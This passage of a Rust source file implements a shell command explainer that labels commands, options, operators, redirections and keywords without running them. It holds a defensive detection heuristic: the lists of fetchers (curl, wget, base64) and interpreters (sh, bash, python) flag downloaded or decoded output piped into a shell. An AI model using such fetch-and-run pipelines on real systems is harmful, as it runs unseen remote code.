//! Explain a shell command line token by token: commands, options, operands,
//! operators, redirections and keywords. Descriptions come from the built-in
//! database, then from local man pages through a `ManLookup`. Nothing is run.

use std::cell::Cell;
use std::collections::HashMap;
use std::sync::Arc;

use serde::Serialize;

use super::db::{self, Doc, Opt, Source, Style};
use super::lexer::{self, Sub, SubKind, Tok, TokKind};

/// Longest input explained; the rest is cut off.
pub const MAX_INPUT: usize = 64 * 1024;
/// Deepest nesting of `bash -c`, `$(...)`, `eval` and the like.
const MAX_DEPTH: usize = 6;
/// Most items across one explanation and everything nested in it.
const MAX_ITEMS: usize = 5000;

/// Source of man page documentation.
pub trait ManLookup: Sync {
    fn lookup(&self, name: &str) -> Option<Arc<Doc>>;
}

/// No man pages, for tests.
#[cfg(test)]
pub struct NoMan;

#[cfg(test)]
impl ManLookup for NoMan {
    fn lookup(&self, _: &str) -> Option<Arc<Doc>> {
        None
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum Kind {
    Command,
    Option,
    Argument,
    Operator,
    Redirect,
    Assignment,
    Keyword,
    Comment,
    Heredoc,
}

#[derive(Debug, Clone, Serialize)]
pub struct Entry {
    /// What is described, for example `-o, --output <file>`.
    pub term: String,
    pub text: String,
    pub source: Source,
}

#[derive(Debug, Clone, Serialize)]
pub struct Nested {
    pub label: String,
    pub explanation: Explanation,
}

#[derive(Debug, Clone, Serialize)]
pub struct Item {
    pub id: usize,
    pub kind: Kind,
    /// The source text the item covers.
    pub label: String,
    pub entries: Vec<Entry>,
    /// Worth a second look (reverse shell device, pipe into a shell, setuid).
    pub warn: bool,
    pub nested: Vec<Nested>,
}

/// A run of the input text, linked to the item that explains it.
#[derive(Debug, Clone, Serialize)]
pub struct Piece {
    pub text: String,
    pub item: Option<usize>,
}

#[derive(Debug, Clone, Serialize)]
pub struct Explanation {
    pub pieces: Vec<Piece>,
    pub items: Vec<Item>,
    pub notes: Vec<String>,
    pub truncated: bool,
}

/// Explain `text`.
pub fn explain(text: &str, man: &dyn ManLookup) -> Explanation {
    let budget = Cell::new(MAX_ITEMS);
    explain_at(
        text,
        &Ctx {
            man,
            depth: 0,
            budget: &budget,
        },
    )
}

#[derive(Clone, Copy)]
struct Ctx<'a> {
    man: &'a dyn ManLookup,
    depth: usize,
    budget: &'a Cell<usize>,
}

fn explain_at(text: &str, ctx: &Ctx) -> Explanation {
    let mut cut = text.len();
    while cut > MAX_INPUT || !text.is_char_boundary(cut) {
        cut -= 1;
    }
    let src = &text[..cut];
    let lexed = lexer::lex(src);
    let n = lexed.toks.len();
    let mut b = Builder {
        src,
        toks: lexed.toks,
        tok_item: vec![None; n],
        items: Vec::new(),
        notes: Vec::new(),
        truncated: cut < text.len() || lexed.truncated,
        docs: HashMap::new(),
        man_docs: HashMap::new(),
        prev_cmd: None,
        prev_op: None,
        case_depth: 0,
        ctx: *ctx,
    };
    b.walk();
    b.finish()
}

const SHELLS: &[&str] = &[
    "sh", "bash", "dash", "zsh", "ksh", "python", "python3", "perl", "ruby", "php", "node",
];
const FETCHERS: &[&str] = &[
    "curl", "wget", "base64", "echo", "printf", "cat", "xxd", "openssl", "rev", "tr", "gunzip",
    "zcat",
];

struct Builder<'s, 'c> {
    src: &'s str,
    toks: Vec<Tok>,
    tok_item: Vec<Option<usize>>,
    items: Vec<Item>,
    notes: Vec<String>,
    truncated: bool,
    docs: HashMap<String, Option<Arc<Doc>>>,
    man_docs: HashMap<String, Option<Arc<Doc>>>,
    prev_cmd: Option<String>,
    prev_op: Option<&'static str>,
    case_depth: usize,
    ctx: Ctx<'c>,
}

fn entry(term: impl Into<String>, text: impl Into<String>, source: Source) -> Entry {
    Entry {
        term: term.into(),
        text: text.into(),
        source,
    }
}

impl Builder<'_, '_> {
    fn finish(mut self) -> Explanation {
        // List items in source order: redirections are handled before the
        // words around them, so their ids are out of order.
        let mut first = vec![usize::MAX; self.items.len()];
        for (t, id) in self.tok_item.iter().enumerate() {
            if let Some(id) = id {
                first[*id] = first[*id].min(t);
            }
        }
        let mut order: Vec<usize> = (0..self.items.len()).collect();
        order.sort_by_key(|&i| (first[i], i));
        let mut remap = vec![0; order.len()];
        for (new, &old) in order.iter().enumerate() {
            remap[old] = new;
        }
        let mut old_items: Vec<Option<Item>> = std::mem::take(&mut self.items)
            .into_iter()
            .map(Some)
            .collect();
        self.items = order
            .iter()
            .enumerate()
            .filter_map(|(new, &old)| {
                old_items[old].take().map(|mut it| {
                    it.id = new;
                    it
                })
            })
            .collect();
        for id in self.tok_item.iter_mut().flatten() {
            *id = remap[*id];
        }
        let mut pieces: Vec<Piece> = Vec::new();
        let mut pos = 0;
        let gap = |pieces: &mut Vec<Piece>, s: &str| {
            if s.is_empty() {
                return;
            }
            match pieces.last_mut() {
                Some(p) if p.item.is_none() => p.text.push_str(s),
                _ => pieces.push(Piece {
                    text: s.to_string(),
                    item: None,
                }),
            }
        };
        for (i, t) in self.toks.iter().enumerate() {
            if t.start > pos {
                gap(&mut pieces, &self.src[pos..t.start]);
            }
            let text = &self.src[t.start..t.end];
            match self.tok_item[i] {
                Some(id) => pieces.push(Piece {
                    text: text.to_string(),
                    item: Some(id),
                }),
                None => gap(&mut pieces, text),
            }
            pos = t.end.max(pos);
        }
        if pos < self.src.len() {
            gap(&mut pieces, &self.src[pos..]);
        }
        let mut notes = self.notes;
        notes.dedup();
        Explanation {
            pieces,
            items: self.items,
            notes,
            truncated: self.truncated,
        }
    }

    fn value(&self, t: usize) -> &str {
        self.toks[t].word().unwrap_or("")
    }

    fn raw(&self, t: usize) -> &str {
        &self.src[self.toks[t].start..self.toks[t].end]
    }

    fn is_op(&self, t: usize, op: &str) -> bool {
        matches!(self.toks.get(t).map(|t| &t.kind), Some(TokKind::Op(o)) if *o == op)
    }

    fn is_word(&self, t: usize) -> bool {
        matches!(
            self.toks.get(t).map(|t| &t.kind),
            Some(TokKind::Word { .. })
        )
    }

    /// Add an item covering `toks`; returns its id.
    fn add(&mut self, kind: Kind, toks: &[usize], entries: Vec<Entry>) -> usize {
        let id = self.items.len();
        let label = match (toks.first(), toks.last()) {
            (Some(&a), Some(&b)) => self.src[self.toks[a].start..self.toks[b].end].to_string(),
            _ => String::new(),
        };
        let left = self.ctx.budget.get();
        if left == 0 {
            self.truncated = true;
        } else {
            self.ctx.budget.set(left - 1);
        }
        for &t in toks {
            if self.tok_item[t].is_none() {
                self.tok_item[t] = Some(id);
            }
        }
        self.items.push(Item {
            id,
            kind,
            label,
            entries,
            warn: false,
            nested: Vec::new(),
        });
        id
    }

    fn warn(&mut self, id: usize, note: Option<&str>) {
        if let Some(it) = self.items.get_mut(id) {
            it.warn = true;
        }
        if let Some(n) = note
            && !self.notes.iter().any(|x| x == n)
        {
            self.notes.push(n.to_string());
        }
    }

    fn nest(&mut self, id: usize, label: impl Into<String>, text: &str) {
        if self.ctx.depth >= MAX_DEPTH || text.trim().is_empty() || self.ctx.budget.get() == 0 {
            return;
        }
        let child = Ctx {
            depth: self.ctx.depth + 1,
            ..self.ctx
        };
        let explanation = explain_at(text, &child);
        if explanation.items.iter().any(|i| i.warn) {
            self.items[id].warn = true;
        }
        for n in &explanation.notes {
            if !self.notes.contains(n) {
                self.notes.push(n.clone());
            }
        }
        self.items[id].nested.push(Nested {
            label: label.into(),
            explanation,
        });
    }

    /// Nested explanations for substitutions inside word `t`.
    fn nest_subs(&mut self, id: usize, t: usize) {
        let subs: Vec<Sub> = match &self.toks[t].kind {
            TokKind::Word { subs, .. } => subs.clone(),
            _ => return,
        };
        for s in subs {
            let label = match s.kind {
                SubKind::Command => "$(...) command substitution: runs this and uses its output",
                SubKind::Backtick => "`...` command substitution: runs this and uses its output",
                SubKind::ProcIn => "<(...) process substitution: the output appears as a file name",
                SubKind::ProcOut => ">(...) process substitution: writes go to this command",
                SubKind::Arith => continue,
            };
            self.nest(id, label, &s.inner);
        }
    }

    fn walk(&mut self) {
        let n = self.toks.len();
        let mut i = 0;
        while i < n {
            if self.ctx.budget.get() == 0 {
                self.truncated = true;
                return;
            }
            match self.toks[i].kind.clone() {
                TokKind::Op(op) => {
                    self.operator(i, op);
                    i += 1;
                }
                TokKind::Comment => {
                    self.add(
                        Kind::Comment,
                        &[i],
                        vec![entry("#", "Comment: ignored by the shell.", Source::Shell)],
                    );
                    i += 1;
                }
                TokKind::Heredoc => {
                    if self.tok_item[i].is_none() {
                        self.add(
                            Kind::Heredoc,
                            &[i],
                            vec![entry(
                                "here-document",
                                "Body of a here-document: given to the command as standard input.",
                                Source::Shell,
                            )],
                        );
                    }
                    i += 1;
                }
                TokKind::Word { .. } if self.is_op(i + 1, "(") && self.is_op(i + 2, ")") => {
                    let name = self.value(i).to_string();
                    self.add(
                        Kind::Keyword,
                        &[i, i + 1, i + 2],
                        vec![entry(
                            format!("{name}()"),
                            format!("Defines a shell function named {name}; the body follows."),
                            Source::Shell,
                        )],
                    );
                    i += 3;
                }
                TokKind::Word { .. } if self.case_depth > 0 && self.is_op(i + 1, ")") => {
                    self.add(
                        Kind::Keyword,
                        &[i, i + 1],
                        vec![entry(
                            "pattern)",
                            "Case pattern: the commands after it run when the value matches.",
                            Source::Shell,
                        )],
                    );
                    i += 2;
                }
                TokKind::Word { .. } | TokKind::Redir { .. } => {
                    let mut j = i;
                    while j < n {
                        match self.toks[j].kind {
                            TokKind::Word { .. } => j += 1,
                            TokKind::Redir { .. } => {
                                j += 1;
                                if self.is_word(j) {
                                    j += 1;
                                }
                            }
                            _ => break,
                        }
                    }
                    self.segment(i, j);
                    i = j;
                }
            }
        }
    }

    fn operator(&mut self, i: usize, op: &'static str) {
        let text = match op {
            "\n" => {
                self.prev_op = None;
                return;
            }
            "|" => {
                "Pipe: the standard output of the command on the left becomes the standard input of the command on the right."
            }
            "|&" => "Pipe standard output and standard error into the next command.",
            "||" => "Or: run the next command only if the previous one failed.",
            "&&" => "And: run the next command only if the previous one succeeded.",
            "&" => "Run the preceding command in the background; the shell does not wait for it.",
            ";" => "Command separator: run the commands one after another.",
            ";;" | ";&" | ";;&" => "Ends the commands for this case pattern.",
            "(" => "Start of a subshell: the commands inside run in a separate shell process.",
            ")" => "End of the subshell.",
            _ => "Shell operator.",
        };
        self.prev_op = Some(op);
        self.add(Kind::Operator, &[i], vec![entry(op, text, Source::Shell)]);
    }

    fn segment(&mut self, i: usize, j: usize) {
        let mut words = Vec::new();
        let mut k = i;
        while k < j {
            match self.toks[k].kind.clone() {
                TokKind::Redir { fd, op } => {
                    let target = (k + 1 < j && self.is_word(k + 1)).then_some(k + 1);
                    self.redirect(k, target, fd.as_deref(), op);
                    k += if target.is_some() { 2 } else { 1 };
                }
                TokKind::Word { .. } => {
                    words.push(k);
                    k += 1;
                }
                _ => k += 1,
            }
        }
        self.words(&words);
    }

    fn is_assignment(&self, t: usize) -> bool {
        let raw = self.raw(t);
        let mut chars = raw.char_indices();
        match chars.next() {
            Some((_, c)) if c.is_ascii_alphabetic() || c == '_' => {}
            _ => return false,
        }
        for (_, c) in chars {
            if c == '=' || c == '[' || c == '+' {
                return raw.contains('=');
            }
            if !(c.is_ascii_alphanumeric() || c == '_') {
                return false;
            }
        }
        false
    }

    fn assignment(&mut self, t: usize, scope: &str) {
        let raw = self.raw(t).to_string();
        let name = raw
            .split(['=', '[', '+'])
            .next()
            .unwrap_or_default()
            .to_string();
        let value = self
            .value(t)
            .split_once('=')
            .map(|(_, v)| v.to_string())
            .unwrap_or_default();
        let mut entries = vec![entry(
            format!("{name}="),
            format!("{scope} {name}."),
            Source::Shell,
        )];
        let (more, warn) = value_notes("", usize::MAX, &value, self.flags(t));
        entries.extend(more);
        let id = self.add(Kind::Assignment, &[t], entries);
        if warn {
            self.warn(id, None);
        }
        self.nest_subs(id, t);
    }

    fn flags(&self, t: usize) -> WordFlags {
        match &self.toks[t].kind {
            TokKind::Word {
                quoted,
                expands,
                glob,
                ..
            } => WordFlags {
                quoted: *quoted,
                expands: *expands,
                glob: *glob,
            },
            _ => WordFlags::default(),
        }
    }

    fn words(&mut self, ws: &[usize]) {
        let mut idx = 0;
        while idx < ws.len() {
            let t = ws[idx];
            if self.flags(t).quoted {
                break;
            }
            let v = self.value(t).to_string();
            let Some(help) = keyword(&v) else {
                break;
            };
            self.add(Kind::Keyword, &[t], vec![entry(&v, help, Source::Shell)]);
            idx += 1;
            match v.as_str() {
                "case" => self.case_depth += 1,
                "esac" => self.case_depth = self.case_depth.saturating_sub(1),
                _ => {}
            }
            match v.as_str() {
                "for" | "select" | "case" => {
                    if idx < ws.len() {
                        let text = if v == "case" {
                            "Value matched against the patterns that follow."
                        } else {
                            "Loop variable: set to each item in turn."
                        };
                        self.add(
                            Kind::Argument,
                            &[ws[idx]],
                            vec![entry("", text, Source::Shell)],
                        );
                        idx += 1;
                    }
                    if idx < ws.len() && self.value(ws[idx]) == "in" {
                        let text = if v == "case" {
                            "The patterns follow."
                        } else {
                            "The list of items follows."
                        };
                        self.add(
                            Kind::Keyword,
                            &[ws[idx]],
                            vec![entry("in", text, Source::Shell)],
                        );
                        idx += 1;
                    }
                    for &w in &ws[idx..] {
                        let (notes, _) = value_notes("", usize::MAX, self.value(w), self.flags(w));
                        let mut e = vec![entry("", "Item to loop over.", Source::Shell)];
                        e.extend(notes);
                        let id = self.add(Kind::Argument, &[w], e);
                        self.nest_subs(id, w);
                    }
                    return;
                }
                "function" if idx < ws.len() => {
                    self.add(
                        Kind::Argument,
                        &[ws[idx]],
                        vec![entry("", "Function name.", Source::Shell)],
                    );
                    idx += 1;
                }
                _ => {}
            }
        }
        let rest = &ws[idx..];
        let assigns = rest.iter().take_while(|&&t| self.is_assignment(t)).count();
        let has_cmd = assigns < rest.len();
        for &t in &rest[..assigns] {
            let scope = if has_cmd {
                "Sets the environment variable for this command only:"
            } else {
                "Sets the shell variable"
            };
            self.assignment(t, scope);
        }
        if has_cmd {
            self.command(&rest[assigns..]);
        }
    }

    fn doc(&mut self, name: &str, allow_man: bool) -> Option<Arc<Doc>> {
        if let Some(d) = self.docs.get(name) {
            return d.clone();
        }
        let d = db::builtin(name)
            .map(|d| Arc::new(d.clone()))
            .or_else(|| allow_man.then(|| self.man(name)).flatten());
        self.docs.insert(name.to_string(), d.clone());
        d
    }

    fn man(&mut self, name: &str) -> Option<Arc<Doc>> {
        if let Some(d) = self.man_docs.get(name) {
            return d.clone();
        }
        let d = self.ctx.man.lookup(name);
        self.man_docs.insert(name.to_string(), d.clone());
        d
    }

    fn command(&mut self, ws: &[usize]) {
        let t0 = ws[0];
        let v0 = self.value(t0).to_string();
        let f0 = self.flags(t0);
        if f0.expands && (v0.starts_with('$') || v0.starts_with('`')) {
            let id = self.add(
                Kind::Command,
                &[t0],
                vec![entry(
                    &v0,
                    "The command name comes from a variable or substitution, so it is only known at run time.",
                    Source::Shell,
                )],
            );
            self.warn(id, None);
            self.nest_subs(id, t0);
            self.prev_cmd = None;
            self.args(None, "", &ws[1..]);
            return;
        }
        let by_path = v0.contains('/');
        let name = v0.rsplit('/').next().unwrap_or(&v0).to_string();
        let local_script =
            by_path && (v0.starts_with("./") || v0.ends_with(".sh") || v0.ends_with(".py"));
        let doc = if name.is_empty() {
            None
        } else {
            self.doc(&name, !local_script)
        };
        let mut entries = vec![match &doc {
            Some(d) => entry(&name, d.summary.clone(), d.source),
            None if local_script => entry(
                &name,
                "Runs this script or program by its path.",
                Source::Shell,
            ),
            None => entry(
                &name,
                "No description: not in the built-in list and no local man page found.",
                Source::Unknown,
            ),
        }];
        if by_path && !local_script {
            entries.push(entry(
                "",
                format!("Runs {v0} by path instead of searching PATH."),
                Source::Shell,
            ));
        }
        let id = self.add(Kind::Command, &[t0], entries);
        if self.prev_op == Some("|")
            && SHELLS.contains(&name.as_str())
            && self
                .prev_cmd
                .as_deref()
                .is_some_and(|p| FETCHERS.contains(&p))
        {
            self.warn(
                id,
                Some("Output of another command (a download, decode or file) is piped straight into an interpreter, so the code that runs is not visible here."),
            );
        }
        // Wrappers (sudo, env, nohup) keep the pipeline context for the command they run.
        if doc.as_ref().is_none_or(|d| d.wrap.is_none()) {
            self.prev_cmd = Some(name.clone());
        }
        self.nest_subs(id, t0);
        self.args(doc, &name, &ws[1..]);
    }

    fn args(&mut self, doc: Option<Arc<Doc>>, name: &str, ws: &[usize]) {
        let mut k = 0;
        let mut end_opts = false;
        let mut pos = 0usize;
        let mut sub: Option<Doc> = None;
        let mut shell_c = false;
        while k < ws.len() {
            if self.ctx.budget.get() == 0 {
                self.truncated = true;
                return;
            }
            let t = ws[k];
            let v = self.value(t).to_string();
            let dashy = !end_opts && v.len() > 1 && v.starts_with('-');
            if let Some(d) = &doc {
                if let Some(n) = d.wrap
                    && pos == n
                    && !dashy
                {
                    let mut m = k;
                    while m < ws.len() && self.is_assignment(ws[m]) {
                        self.assignment(ws[m], "Sets the environment variable for the command:");
                        m += 1;
                    }
                    if m < ws.len() {
                        self.command(&ws[m..]);
                    }
                    return;
                }
                if let Some(n) = d.remote
                    && pos == n
                    && !dashy
                {
                    self.remote(name, &ws[k..]);
                    return;
                }
            }
            if !end_opts && v == "--" && !self.flags(t).quoted {
                self.add(
                    Kind::Option,
                    &[t],
                    vec![entry(
                        "--",
                        "End of options: what follows are operands even if they start with -.",
                        Source::Shell,
                    )],
                );
                end_opts = true;
                k += 1;
                continue;
            }
            if !end_opts
                && name == "find"
                && let Some(next) = self.find_special(ws, k)
            {
                k = next;
                continue;
            }
            if dashy {
                k = self.option(doc.as_deref(), sub.as_ref(), name, ws, k, &mut shell_c);
                continue;
            }
            if let Some(d) = doc.as_deref() {
                if !end_opts && v.contains('=') {
                    let key = v.split('=').next().unwrap_or_default();
                    if let Some(o) = find_word(&[Some(d)], &format!("{key}=")) {
                        let e = vec![entry(o.term(), o.help.clone(), d.source)];
                        self.add(Kind::Option, &[t], e);
                        k += 1;
                        continue;
                    }
                }
                if !end_opts
                    && k == 0
                    && d.style == Style::Bundled
                    && v.chars().all(|c| c.is_ascii_alphabetic())
                    && v.chars().all(|c| find_short(&[Some(d)], c).is_some())
                {
                    k = self.cluster(Some(d), None, ws, k, &v, &mut shell_c);
                    continue;
                }
            }
            if shell_c && pos == 0 {
                let id = self.add(
                    Kind::Argument,
                    &[t],
                    vec![entry("", "Command string run by the shell.", Source::Shell)],
                );
                self.nest(id, "Commands in the string", &v);
                pos += 1;
                k += 1;
                continue;
            }
            if let Some(d) = doc.as_deref()
                && sub.is_none()
                && pos == 0
                && !d.subs.is_empty()
                && let Some(s) = d.sub(&v)
            {
                self.add(
                    Kind::Command,
                    &[t],
                    vec![entry(
                        format!("{name} {v}"),
                        s.summary.clone(),
                        Source::Builtin,
                    )],
                );
                sub = Some(s.clone());
                k += 1;
                continue;
            }
            let ad = sub
                .as_ref()
                .filter(|s| !s.args.is_empty())
                .or(doc.as_deref())
                .and_then(|d| d.arg(pos).cloned());
            let mut entries = Vec::new();
            if let Some(a) = ad {
                entries.push(entry(a.name, a.help, Source::Builtin));
            }
            let (more, warn) = value_notes(name, pos, &v, self.flags(t));
            entries.extend(more);
            if entries.is_empty() {
                entries.push(entry(
                    "",
                    format!(
                        "Operand passed to {}.",
                        if name.is_empty() { "the command" } else { name }
                    ),
                    Source::Unknown,
                ));
            }
            let id = self.add(Kind::Argument, &[t], entries);
            if warn {
                self.warn(id, Some(warn_note(&v)));
            }
            self.nest_subs(id, t);
            pos += 1;
            k += 1;
        }
    }

    /// `find` grouping operators and `-exec ... ;`. Returns the next index if handled.
    fn find_special(&mut self, ws: &[usize], k: usize) -> Option<usize> {
        let t = ws[k];
        let v = self.value(t).to_string();
        let text = match v.as_str() {
            "!" => "Not: negates the next test.",
            "(" => "Start of a group of tests.",
            ")" => "End of a group of tests.",
            "-exec" | "-execdir" | "-ok" | "-okdir" => "",
            _ => return None,
        };
        if !text.is_empty() {
            self.add(Kind::Operator, &[t], vec![entry(&v, text, Source::Builtin)]);
            return Some(k + 1);
        }
        let mut e = k + 1;
        while e < ws.len() && !matches!(self.value(ws[e]), ";" | "+") {
            e += 1;
        }
        let help = db::builtin("find")
            .and_then(|d| find_word(&[Some(d)], &v[1..]))
            .map(|o| o.help)
            .unwrap_or_default();
        let mut entries = vec![entry(&v, help, Source::Builtin)];
        if e < ws.len() {
            let how = if self.value(ws[e]) == "+" {
                "Ends with +: many paths are passed to one run of the command."
            } else {
                "Ends with ;: the command runs once for each path ({} is replaced by the path)."
            };
            entries.push(entry(self.raw(ws[e]).to_string(), how, Source::Builtin));
        }
        let last = e.min(ws.len() - 1);
        let group: Vec<usize> = ws[k..=last].to_vec();
        let id = self.add(Kind::Option, &group, entries);
        if e > k + 1 {
            let inner = self.src[self.toks[ws[k + 1]].start..self.toks[ws[e - 1]].end].to_string();
            self.nest(id, "Command run for each match", &inner);
        }
        Some(e + 1)
    }

    fn remote(&mut self, name: &str, ws: &[usize]) {
        let joined: Vec<&str> = ws.iter().map(|&t| self.value(t)).collect();
        let joined = joined.join(" ");
        let (term, text, label) = if name == "eval" {
            (
                "eval",
                "These arguments are joined with spaces and run as shell commands.",
                "Commands run by eval",
            )
        } else {
            (
                "command",
                "Command line run on the remote host.",
                "Commands run remotely",
            )
        };
        let id = self.add(Kind::Argument, ws, vec![entry(term, text, Source::Builtin)]);
        self.nest(id, label, &joined);
    }

    #[allow(clippy::too_many_arguments)]
    fn cluster(
        &mut self,
        doc: Option<&Doc>,
        sub: Option<&Doc>,
        ws: &[usize],
        mut k: usize,
        letters: &str,
        shell_c: &mut bool,
    ) -> usize {
        let man = doc
            .filter(|d| {
                d.source == Source::Builtin
                    && letters
                        .chars()
                        .any(|c| find_short(&[sub, Some(d)], c).is_none())
            })
            .and_then(|d| self.man(&d.name.clone()));
        let docs = [sub, doc, man.as_deref()];
        let chars: Vec<char> = letters.chars().collect();
        let mut toks = vec![ws[k]];
        let mut entries = Vec::new();
        let mut nested: Option<String> = None;
        for (ci, &c) in chars.iter().enumerate() {
            match find_short_src(&docs, c) {
                Some((o, src)) => {
                    let rest: String = chars[ci + 1..].iter().collect();
                    if o.arg.is_some() && !o.arg_optional {
                        let argv = if !rest.is_empty() {
                            rest
                        } else if k + 1 < ws.len() {
                            k += 1;
                            toks.push(ws[k]);
                            self.value(ws[k]).to_string()
                        } else {
                            String::new()
                        };
                        if o.arg_is_command() {
                            nested = Some(argv.clone());
                        }
                        let mut text = o.help.clone();
                        if !argv.is_empty() {
                            text.push_str(&format!(" Value: {argv}"));
                        }
                        entries.push(entry(o.term(), text, src));
                        break;
                    }
                    let term = o.term();
                    if !entries.iter().any(|e: &Entry| e.term == term) {
                        entries.push(entry(term, o.help.clone(), src));
                    }
                    if doc.is_some_and(|d| d.shell_c) && c == 'c' {
                        *shell_c = true;
                    }
                    if o.arg_optional && !rest.is_empty() {
                        break;
                    }
                }
                None => entries.push(entry(
                    format!("-{c}"),
                    "Not in the built-in list or the local man page.",
                    Source::Unknown,
                )),
            }
        }
        let id = self.add(Kind::Option, &toks, entries);
        if let Some(n) = nested {
            self.nest(id, "Command in the option", &n);
        }
        k + 1
    }

    #[allow(clippy::too_many_arguments)]
    fn option(
        &mut self,
        doc: Option<&Doc>,
        sub: Option<&Doc>,
        name: &str,
        ws: &[usize],
        mut k: usize,
        shell_c: &mut bool,
    ) -> usize {
        let t = ws[k];
        let v = self.value(t).to_string();
        if doc.is_none() {
            self.add(
                Kind::Option,
                &[t],
                vec![entry(
                    &v,
                    "Option (no description available).",
                    Source::Unknown,
                )],
            );
            return k + 1;
        }
        let man = |b: &mut Self| -> Option<Arc<Doc>> {
            doc.filter(|d| d.source == Source::Builtin)
                .and_then(|d| b.man(&d.name.clone()))
        };
        if let Some(body) = v.strip_prefix("--") {
            let (key, val) = match body.split_once('=') {
                Some((a, b)) => (a, Some(b.to_string())),
                None => (body, None),
            };
            let mut found =
                find_long(&[sub, doc], key).map(|o| (o, doc.map_or(Source::Builtin, |d| d.source)));
            if found.is_none() {
                let m = man(self);
                found = find_long(&[m.as_deref()], key).map(|o| (o, Source::Man));
            }
            let Some((o, src)) = found else {
                self.add(
                    Kind::Option,
                    &[t],
                    vec![entry(
                        &v,
                        "Not in the built-in list or the local man page.",
                        Source::Unknown,
                    )],
                );
                return k + 1;
            };
            return self.with_arg(&o, src, ws, k, val);
        }
        let body = &v[1..];
        // Whole-word options first (-name, -sS, -EncodedCommand, -9).
        let key = body.split('=').next().unwrap_or(body);
        let mut found = find_word(&[sub, doc], key)
            .or_else(|| find_word(&[sub, doc], &format!("{key}=")))
            .map(|o| (o, doc.map_or(Source::Builtin, |d| d.source)));
        if found.is_none()
            && body.chars().count() > 1
            && !body.chars().all(|c| find_short(&[sub, doc], c).is_some())
        {
            let m = man(self);
            found = find_word(&[m.as_deref()], key).map(|o| (o, Source::Man));
        }
        if let Some((o, src)) = found {
            if doc.is_some_and(|d| d.shell_c) && o.short.contains(&'c') {
                *shell_c = true;
            }
            let val = body.split_once('=').map(|(_, b)| b.to_string());
            return self.with_arg(&o, src, ws, k, val);
        }
        if matches!(name, "head" | "tail") && body.chars().all(|c| c.is_ascii_digit()) {
            self.add(
                Kind::Option,
                &[t],
                vec![entry(
                    &v,
                    format!("Number of lines: {body} (same as -n {body})."),
                    Source::Builtin,
                )],
            );
            return k + 1;
        }
        if matches!(name, "kill" | "pkill" | "killall")
            && let Some(text) = signal(body)
        {
            self.add(Kind::Option, &[t], vec![entry(&v, text, Source::Builtin)]);
            return k + 1;
        }
        k = self.cluster(doc, sub, ws, k, body, shell_c);
        k
    }

    /// Item for an option that may take an argument (attached `val` or the next word).
    fn with_arg(
        &mut self,
        o: &Opt,
        src: Source,
        ws: &[usize],
        mut k: usize,
        val: Option<String>,
    ) -> usize {
        let mut toks = vec![ws[k]];
        let mut argv = val;
        if o.arg.is_some() && argv.is_none() && !o.arg_optional && k + 1 < ws.len() {
            k += 1;
            toks.push(ws[k]);
            argv = Some(self.value(ws[k]).to_string());
        }
        let mut text = o.help.clone();
        if let Some(a) = argv.as_deref().filter(|a| !a.is_empty()) {
            text.push_str(&format!(" Value: {a}"));
        }
        let id = self.add(Kind::Option, &toks, vec![entry(o.term(), text, src)]);
        if let Some(a) = argv.as_deref() {
            if o.arg_is_command() {
                self.nest(id, "Command in the option", a);
            }
            let (_, warn) = value_notes("", usize::MAX, a, WordFlags::default());
            if warn {
                self.warn(id, Some(warn_note(a)));
            }
        }
        if let Some(&last) = toks.last()
            && toks.len() > 1
        {
            self.nest_subs(id, last);
        }
        k + 1
    }

    fn redirect(&mut self, k: usize, target: Option<usize>, fd: Option<&str>, op: &str) {
        let tv = target
            .map(|t| self.value(t).to_string())
            .unwrap_or_default();
        let quoted = target.is_some_and(|t| self.flags(t).quoted);
        let s = |fd: Option<&str>, def: &str| stream(fd.unwrap_or(def));
        let text = match op {
            ">" => format!(
                "Redirect {} to the file {tv}, replacing its contents.",
                s(fd, "1")
            ),
            ">>" => format!("Append {} to the file {tv}.", s(fd, "1")),
            ">|" => format!(
                "Redirect {} to {tv}, replacing it even if noclobber is set.",
                s(fd, "1")
            ),
            "<" => format!("Read {} from the file {tv}.", s(fd, "0")),
            "<>" => format!("Open {tv} for reading and writing as {}.", s(fd, "0")),
            ">&" | "<&" => {
                let def = if op == ">&" { "1" } else { "0" };
                if tv == "-" {
                    format!("Close {}.", s(fd, def))
                } else if !tv.is_empty() && tv.chars().all(|c| c.is_ascii_digit()) {
                    format!(
                        "Send {} to the same place as {} (2>&1 merges errors into output).",
                        s(fd, def),
                        stream(&tv)
                    )
                } else {
                    format!("Redirect standard output and standard error to {tv}.")
                }
            }
            "&>" => format!(
                "Redirect standard output and standard error to {tv}, replacing its contents."
            ),
            "&>>" => format!("Append standard output and standard error to {tv}."),
            "<<" | "<<-" => {
                let mut t = format!(
                    "Here-document: the following lines, up to a line reading {tv}, become standard input."
                );
                if op == "<<-" {
                    t.push_str(" Leading tabs are removed.");
                }
                if quoted {
                    t.push_str(
                        " The delimiter is quoted, so $ expansions in the body are not done.",
                    );
                }
                t
            }
            "<<<" => format!("Here-string: the text {tv} becomes standard input."),
            _ => "Redirection.".to_string(),
        };
        let mut toks = vec![k];
        toks.extend(target);
        let mut entries = vec![entry(
            self.src[self.toks[k].start..self.toks[k].end].to_string(),
            text,
            Source::Shell,
        )];
        let (more, warn) = value_notes("", usize::MAX, &tv, WordFlags::default());
        entries.extend(more);
        let id = self.add(Kind::Redirect, &toks, entries);
        if warn {
            self.warn(id, Some(warn_note(&tv)));
        }
        if let Some(t) = target {
            self.nest_subs(id, t);
        }
        // Tie the here-document body to this redirection.
        if op.starts_with("<<")
            && op != "<<<"
            && let Some(h) = (k..self.toks.len()).find(|&i| self.toks[i].kind == TokKind::Heredoc)
            && self.tok_item[h].is_none()
        {
            self.tok_item[h] = Some(id);
        }
    }
}

#[derive(Debug, Default, Clone, Copy)]
struct WordFlags {
    quoted: bool,
    expands: bool,
    glob: bool,
}

fn stream(fd: &str) -> String {
    match fd {
        "0" => "standard input".into(),
        "1" => "standard output".into(),
        "2" => "standard error".into(),
        n => format!("file descriptor {n}"),
    }
}

fn keyword(w: &str) -> Option<&'static str> {
    Some(match w {
        "if" => "Starts a conditional: the commands after then run if this command succeeds.",
        "then" => "Commands to run when the condition succeeded.",
        "elif" => "Else if: another condition to try.",
        "else" => "Commands to run when no condition succeeded.",
        "fi" => "End of the if block.",
        "for" => "Loop: runs the body once for each item.",
        "select" => "Menu loop: shows the items and runs the body for the one chosen.",
        "while" => "Loop: runs the body as long as this command succeeds.",
        "until" => "Loop: runs the body until this command succeeds.",
        "do" => "Start of the loop body.",
        "done" => "End of the loop body.",
        "case" => "Runs the commands for the first pattern that matches the value.",
        "esac" => "End of the case block.",
